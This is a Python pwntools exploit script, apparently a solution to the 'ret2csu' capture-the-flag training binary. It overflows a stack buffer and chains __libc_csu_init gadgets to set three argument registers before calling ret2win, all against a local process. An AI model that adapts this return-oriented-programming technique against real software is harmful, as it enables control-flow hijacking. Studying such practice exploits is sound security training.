from pwn import *

context.bits = 64
elf = ELF("./ret2csu")

csu_mov = p64(0x400680)
csu_pop = p64(0x40069a)
pop_rdi = p64(0x4006a3)
safe_ptr = p64(0x600df8)
ret2win = p64(elf.symbols["ret2win"])

ARG_RDI = 0xdeadbeefdeadbeef
ARG_RSI = 0xcafebabecafebabe
ARG_RDX = 0xd00df00dd00df00d

payload  = b"A" * 40
payload += csu_pop
payload += p64(0)
payload += p64(1)
payload += safe_ptr
payload += p64(ARG_RDI)
payload += p64(ARG_RSI)
payload += p64(ARG_RDX)
payload += csu_mov
payload += p64(0) * 7
payload += pop_rdi + p64(ARG_RDI)
payload += ret2win

p = process("./ret2csu")
p.sendline(payload)
print(p.recvall().decode())
